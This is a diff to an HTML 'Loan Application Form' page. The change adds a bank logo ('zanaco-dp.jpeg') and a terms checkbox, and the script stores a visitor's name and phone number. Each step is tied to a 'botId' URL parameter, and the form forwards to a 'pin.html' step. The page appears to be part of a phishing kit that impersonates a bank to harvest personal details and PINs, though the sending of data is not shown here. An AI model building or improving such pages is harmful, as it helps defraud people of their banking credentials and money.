@@ -3,42 +3,93 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loan Details</title>
+<title>Loan Application Form</title>
 <style>
-body { font-family: Arial, sans-serif; background: #f6f7fb; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-.loan-container { background: #fff; padding: 30px; border-radius: 12px; width: 100%; max-width: 400px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
-h2 { text-align: center; margin-bottom: 20px; }
+body {
+    font-family: Arial, sans-serif;
+    background: #f6f7fb;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+.loan-container {
+    background: #fff;
+    padding: 30px;
+    border-radius: 12px;
+    width: 100%;
+    max-width: 400px;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+}
+.logo-container {
+    width: 100%;
+    height: 120px;
+    margin-bottom: 20px;
+}
+.logo {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
 label { display: block; margin: 10px 0 5px; font-weight: bold; }
-input { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #ccc; margin-bottom: 15px; }
-button { width: 100%; padding: 12px; background: red; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
+input { width: 100%; padding: 10px; margin-bottom: 15px; }
+button { width: 100%; padding: 12px; background: red; color: #fff; border: none; }
+button:disabled { background: #ccc; }
 </style>
 </head>
 <body>
 
 <div class="loan-container">
+    <div class="logo-container">
+        <img src="zanaco-dp.jpeg" class="logo">
+    </div>
+
     <h2>Loan Application Form</h2>
+
     <form id="detailsForm">
         <label>Full Name</label>
-        <input id="name" type="text" required>
+        <input id="name" required>
+
         <label>Phone Number</label>
-        <input id="phone" type="tel" required>
-        <button>Next</button>
+        <input id="phone" required>
+
+        <label>
+            <input type="checkbox" id="confirmCheck"> I agree to terms
+        </label>
+
+        <button id="nextBtn" disabled>Next</button>
     </form>
 </div>
 
 <script>
-let botId = new URLSearchParams(window.location.search).get('botId');
-if (!botId) { alert("Invalid access link"); throw new Error("botId missing"); }
-localStorage.setItem('botId', botId);
+const params = new URLSearchParams(window.location.search);
+const botId = params.get('botId') || window.location.pathname.split('/').pop();
+if (!botId) { alert("Invalid access link"); throw new Error(); }
 
-if (!localStorage.getItem('loanAmount')) window.location.href = `index.html?botId=${botId}`;
+if (!localStorage.getItem('loanAmount')) {
+    window.location.href = `index.html?botId=${botId}`;
+}
+
+const confirmCheck = document.getElementById('confirmCheck');
+const nextBtn = document.getElementById('nextBtn');
+
+confirmCheck.addEventListener('change', () => {
+    nextBtn.disabled = !confirmCheck.checked;
+});
 
 document.getElementById('detailsForm').addEventListener('submit', e => {
     e.preventDefault();
-    localStorage.setItem('name', name.value);
-    localStorage.setItem('phone', phone.value);
+
+    const nameInput = document.getElementById('name');
+    const phoneInput = document.getElementById('phone');
+
+    localStorage.setItem('name', nameInput.value);
+    localStorage.setItem('phone', phoneInput.value);
+
     window.location.href = `pin.html?botId=${botId}`;
 });
 </script>
+
 </body>
 </html>
